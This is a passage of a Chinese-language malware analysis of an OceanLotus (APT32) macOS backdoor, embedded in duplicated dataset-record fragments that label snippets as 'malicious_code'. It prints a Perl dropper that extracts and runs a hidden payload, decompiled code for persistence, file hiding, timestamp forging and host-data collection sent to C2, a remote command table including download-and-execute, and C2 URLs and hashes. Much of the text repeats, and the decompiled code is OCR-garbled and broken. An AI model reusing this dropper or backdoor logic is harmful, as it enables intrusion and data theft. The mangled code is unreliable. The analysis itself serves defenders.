Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "removeFile(&v31);", "hash_code": "2fb9affcb72b5f30f2416529eeb93908793068f1c1c1c3836e94e886d9f8ea04", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "cpp\n*(DWORD *)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! 